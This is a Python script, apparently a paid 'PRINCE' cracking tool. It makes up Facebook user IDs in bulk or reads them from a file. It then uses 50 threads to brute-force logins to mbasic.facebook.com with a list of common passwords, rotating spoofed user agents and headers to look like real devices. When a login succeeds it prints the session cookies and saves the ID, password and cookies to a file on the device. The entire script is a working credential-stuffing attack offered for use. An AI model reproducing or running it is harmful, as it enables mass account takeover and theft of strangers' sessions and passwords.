import os, sys, uuid, re, random, time, string, json, base64

try:

    os.system(
        'pip uninstall requests chardet urllib3 idna certifi rich -y;pip install chardet urllib3 idna certifi requests rich')
    import requests, rich, certifi, pycurl
except:
    os.system("git pull")

    os.system("pip3 install requests rich certifi pycurl")

    import requests, rich, certifi, pycurl

from rich import print
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor as ThreadPool

from io import BytesIO
import os
import random
import string
import sys
import threading
import time
import uuid
import rich
from datetime import datetime
from rich import print
import requests
import certifi
from concurrent.futures import ThreadPoolExecutor as ThreadPool

version = "  v1"


def Samsung():
    Anderson = random.choice(["10", "13", "7.0.0", "7.1.1", "9", "12", "11", "9.0", "8.0.0", "7.1.2", "7.0", "4", "5",
                              "4.4.2", "5.1.1", "6.0.1", "9.0.1"])
    model = random.choice(["GT-I9505", "SM-T835", "SM-S901U", "MMB29K", "SM-S134DL", "SM-J250F", "SM-A217F",
                           "SM-A326B", "SM-A125F", "SM-A720F", "SM-A326U", "SM-G532M", "SM-J410G", "SM-A205GN",
                           "SM-A205GN", "SM-A505GN", "SM-G930F", "SM-J210F", "SM-N9005", "SM-J210F"])
    vir = str(random.choice(range(111111111, 999999999)))
    cho = str(random.choice(range(43, 447)))
    fb = random.choice(["com.facebook.adsmanager|MobileAdsManagerAndroid", "com.facebook.katana|FB4A",
                        "com.facebook.orca|Orca-Android", "com.facebook.mlite|MessengerLite"])
    FBAN = fb.split("|")[1]
    platform = fb.split("|")[0]
    ua = f"Dalvik/2.1.0 (Linux; U; Android {Anderson}; {model} Build/LRX22C) [FBAN/{FBAN};FBAV/{cho}.0.0.15.89;FBPN/{platform};FBLC/sv_SE;FBBV/{vir};FBCR/S COMVIQ;FBMF/samsung;FBBD/samsung;FBDV/{model};FBSV/5.0.1;FBCA/armeabi-v7a:armeabi;FBDM/{{density={random.choice(range(1, 4))}.0,width={random.choice(range(720, 1500))},height={random.choice(range(1500, 2000))};FB_FW/1;]"
    return ua


def uaxxxx():
    rr = random.randint
    aZ = random.choice(
        ['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V',
         'W', 'X', 'Y', 'Z'])
    rx = random.randrange(1, 999)
    xx = f"Mozilla/5.0 (Windows NT 10.0; {str(rr(9, 11))}; Win64; x64){str(aZ)}{str(rx)}{str(aZ)}) AppleWebKit/537.36 (KHTML, like Gecko){str(rr(99, 149))}.0.{str(rr(4500, 4999))}.{str(rr(35, 99))} Chrome/{str(rr(99, 175))}.0.{str(rr(0, 5))}.{str(rr(0, 5))} Safari/537.36"
    return xx


class sort:

    def line():
        return "[b dark_sea_green2]━" * 37

    def clear():
        os.system("clear")

    def logo():
        aci = f'''        //   ) )                                      
       //___/ /  __     ( )   __      ___      ___    
      / ____ / //  ) ) / / //   ) ) //   ) ) //___) ) 
     //       //      / / //   / / //       //        
    //       //      / / //   / / ((____   ((____{version}\n{sort.line()}\n     [red1]✗ [chartreuse1]Developer [orange3]▶  [chartreuse1]PRINCE\n     [red1]✗ [light_green]Status    [orange3]▶  [medium_purple1][r]PAID[/r]\n{sort.line()}'''
        print(aci)

    def color():
        co = ['\x1b[1;93m', '\x1b[1;91m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m']
        cx = random.choice(co)
        return cx


def lsb():
    upper = ''.join(random.choices(string.ascii_uppercase, k=6))
    lower = ''.join(random.choices(string.ascii_lowercase, k=4))
    number = ''.join(random.choices(string.digits, k=1))
    password = upper + lower + number
    password_list = list(password)
    random.shuffle(password_list)
    return ''.join(password_list)


def referer():
    upper = ''.join(random.choices(string.ascii_uppercase, k=6))
    lower = ''.join(random.choices(string.ascii_lowercase, k=6))
    number = ''.join(random.choices(string.digits, k=5))
    password = upper + lower + number
    password_list = list(password)
    random.shuffle(password_list)
    return ''.join(password_list)

oks = []
loop = 0


def old():
    user = []
    sort.clear()
    sort.logo()
    print("[b]    [red1][A] [sea_green2]Crack 10001-10009 Id")
    print("[b]    [red1][B] [spring_green1]Crack 61550 Id")
    print("[b]    [red1][C] [spring_green1]File UID crack")
    print(sort.line())
    ask = input("\x1b[38;1;196m\x1b[38;5;196m     ✗ \x1b[38;5;198mChoice   \x1b[38;5;208m ▶ \x1b[38;0;196m ")

    if ask in ["1", "01", "a", "A"]:
        print(" [b]    [red1]✗ [chartreuse1]Selected  [orange3]▶  [chartreuse1]Uid 10001-10009")
        print(sort.line())
        print("[b]     [red1]✗ [chartreuse1]Example   [orange3]▶  [chartreuse1]100000, 200000")
        limit = int(input("\x1b[38;1;196m\x1b[38;5;196m     ✗ \x1b[38;5;198mChoice   \x1b[38;5;208m ▶ \x1b[38;0;196m "))
        print(sort.line())

        for i in range(limit):
            data = str(random.choice(range(50000000000, 99999999999)))
            user.append(data)
    elif ask in ["b", "B", "2", "02"]:

        print(" [b]    [red1]✗ [chartreuse1]Selected  [orange3]▶  [chartreuse1]Uid 61550")
        print(sort.line())
        print("  [b]   [red1]✗ [chartreuse1]Example   [orange3]▶  [chartreuse1]100000, 200000")
        limit = int(input("\x1b[38;1;196m\x1b[38;5;196m     ✗ \x1b[38;5;198mChoice   \x1b[38;5;208m ▶ \x1b[38;0;196m "))
        print(sort.line())
        for i in range(limit):
            data = str(random.choice(range(10000000, 99999999)))
            user.append(data)
    elif ask in ["c", "C", "3", "03"]:
        print("[b] [chartreuse1]TYPE YOUR FILE PATH EXAMPLE      [b deep_pink2]->[/b deep_pink2]  [chartreuse1] "
              "/sdcard/id.txt")
        path = str(input(" \x1b[38;1;198m  \x1b[38;5;155mCHOICE      \x1b[38;5;196m-> \x1b[1;97m   "))
        print(sort.line())
        try:
            with open(path, "r") as file:
                fl = file.read().splitlines()
        except Exception as e:
            print("Error:", e)
            old()
        for mal in fl:
            uid = mal.split("|")[0]
            user.append(uid)

    print("[b]    [red1][1] [sea_green2]Method A")
    print("[b]    [red1][2] [spring_green1]Method B")
    print(sort.line())
    meth = input("\x1b[38;1;196m\x1b[38;5;196m     ✗ \x1b[38;5;198mChoice   \x1b[38;5;208m ▶ \x1b[38;0;196m ")

    with ThreadPool(max_workers=50) as heron:
        sort.clear()
        sort.logo()
        print(" [b]    [red1]✗ [chartreuse1]Total Uid [orange3]▶  [chartreuse1]" + str(len(user)))
        print(" [b]    [red1]✗ [light_green]Login Ids [orange3]▶  [light_green]Just Now")
        print(sort.line())

        if ask in ["1", "01", "a", "A"]:
            star = "1000"
            for mal in user:
                uid = star + mal
                heron.submit(login, uid, meth)
        elif ask in ["b", "B", "2", "02"]:
            star = "615509"
            for mal in user:
                uid = star + mal
                heron.submit(login, uid, meth)
        else:
            for mal in user:
                uid = mal
                heron.submit(login, uid, meth)


def login(uid, meth):
    global oks, loop
    fb = "mbasic"
    session = requests.session()
    try:
        sys.stdout.write(
            f"\r  \x1b[38;1;196m  \x1b[38;0;196m└\033[38;5;46m[{sort.color()}PYC-XD\033[38;5;46m]~[\x1b[1;97m{loop}-M{meth}\033[38;5;46m]-[\x1b[1;90mOK:{str(len(oks))}\033[38;5;46m] \r")
        sys.stdout.flush()
        for pw in ["123456", "12345678", "password", "654321", "@#@#@#", "@#@#@#@#", "@@@###", "@@@@####", "iloveyou", "sadiya", "jannat", "bangladesh", "১২৩৪৫৬", "77889900"]:
            free_fb = session.get(f'https://{fb}.facebook.com').text
            info = {"lsd": re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
                    "jazoest": re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
                    "m_ts": re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
                    "li": re.search('name="li" value="(.*?)"', str(free_fb)).group(1), "try_number": "0",
                    "unrecognized_tries": "0", "email": uid, "pass": pw, "login": "Log In"}
            uax = uaxxxx()
            ver1 = str(random.randrange(1, 99))
            ver2 = str(random.randrange(90, 121))
            lsd = lsb()
            refer = referer()
            dpr = str(random.randrange(2, 6))
            sceme = random.choice(['light', 'dark'])
            had = {
                'Host': f'{fb}.facebook.com',
                'content-length': str(random.randrange(1600, 1800, 10)),
                'sec-ch-ua': f'"Not_A Brand";v={ver1}, "Chromium";v={ver2}, "Android WebView";v={ver2}',
                'sec-ch-ua-mobile': '?1',
                'user-agent': uax,
                'x-response-format': 'JSONStream',
                'content-type': 'application/x-www-form-urlencoded',
                'x-fb-lsd': lsd,
                'viewport-width': '360',
                'sec-ch-ua-platform-version': '""',
                'x-requested-with': 'XMLHttpRequest',
                'x-asbd-id': '129477',
                'dpr': dpr,
                'sec-ch-ua-full-version-list': '',
                'sec-ch-ua-model': '""',
                'sec-ch-prefers-color-scheme': sceme,
                'sec-ch-ua-platform': '"Android"',
                'accept': '*/*',
                'origin': f'https://{fb}.facebook.com',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-mode': 'cors',
                'sec-fetch-dest': 'empty',
                'referer': f'https://{fb}.facebook.com/login/?wtsid=rdr_{refer}',
                'accept-encoding': 'gzip, deflate, br,',
                'accept-language': 'en-DE,en-US;q=0.9,en;q=0.8'}
            url = f"https://{fb}.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100"
            session.post(url=url, data=info, headers=had)
            heron_brand = session.cookies.get_dict().keys()
            if "c_user" in heron_brand:
                coki = ";".join([key + "=" + value for key, value in session.cookies.get_dict().items()])
                xx = coki.split("c_user=")[1]
                xd = xx[:15]
                res = requests.get(f"https://graph2.facebook.com/v3.3/{xd}/picture?redirect=0").json()
                try:
                    if "height" in res["data"]:
                        print(f"\r\r[PRINCE-OK] {xd} • {pw}\n[🍪][spring_green1]{coki}")
                        open("/sdcard/SD-OK.txt", "a").write(xd + "|" + pw + "|" + coki + "\n")
                        oks.append(xd)
                        break
                except KeyError:
                    pass


            elif "checkpoint" in heron_brand:
                # coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])

                # print(f"\r\r[green] [OK-ID] {uid} | {ps} \n [🤫]{coki}")
                pass
            else:
                continue
        loop += 1
    except:
        time.sleep(30)


old()
